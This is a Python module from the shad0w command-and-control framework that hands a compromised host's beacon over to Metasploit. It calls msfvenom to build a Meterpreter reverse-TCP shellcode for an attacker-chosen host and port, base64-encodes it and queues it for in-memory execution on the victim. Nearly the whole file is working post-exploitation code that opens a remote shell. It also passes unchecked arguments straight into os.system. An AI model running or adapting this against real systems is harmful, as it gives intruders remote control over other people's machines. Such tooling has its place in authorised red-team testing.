#
# metasploit handover module
#

from lib import buildtools, tools, shellcode
import os
import argparse
__description__ = "metasploit handover module, will generate and deploy metasploit payload into memory"
__author__ = "@Flangvik"

EXEC_ID = 0x3000

class DummyClass(object):
    def __init__(self):
        pass

# let argparse error and exit nice
def error(message):
    #global ERROR, error_list
    #ERROR = True
    print(f"\033[0;31m{message}\033[0m\n")

def exit(status=0, message=None):
    if message != None: print(message)
    return


def msfvenom_payload_gen(payload, lport, lhost, arch, beaconId):

    # Print some info
    print(f"[i] Metasploit is building the shellcode...")

    # put us in the correct dir (inside docker)
    os.chdir("/root/shad0w/bin/metasploit")

    #Generate the shellcode
    os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw -a {arch} > {beaconId}.bin")

    #Base64 encode
    os.system(f"cat {beaconId}.bin | base64 -w 0 > {beaconId}.b64")

    # Read and return the b64Shellcode
    b64File = open(f'{beaconId}.b64',mode='r')
    shellCodeB64 = b64File.read()
    b64File.close()

    return shellCodeB64


def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon")
        return

    # init the parser
    parser = argparse.ArgumentParser(prog='meterpreter',formatter_class=argparse.RawDescriptionHelpFormatter, epilog="")

    # keep it behaving nice
    parser.exit = exit
    parser.error = error

    # setup the args, set default='' to show help message when missing
    parser.add_argument("--port", nargs='+', required=True, help="Port you would like metasploit to call")
    parser.add_argument("--host", nargs='+', required=True, help="Host/IP you would like metasploit to call")
    parser.add_argument("--payload",  nargs='+', help="What metasploit payload you would like to deploy , default: windows/x64/meterpreter_reverse_tcp",required=False, default="windows/x64/meterpreter_reverse_tcp")

    # make sure we dont die from weird args
    try:
        args = parser.parse_args(args[1:])
    except:
        pass

    #If we are missing port or host (since the skip the above check)
    if not args.port or not args.host:
        parser.print_help()
        return

    #Confirm that the payload used is x64 only
    if "windows/x64/" not in args.payload:
        error("Payload needs to be x64 specific!(eg: 'windows/x64/***') Try again!")
        return

    # Generate and read the msfvenom shellcode
    rcode = msfvenom_payload_gen(payload = args.payload, lport = args.port, lhost = args.host, arch="x64", beaconId = shad0w.current_beacon)

    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)
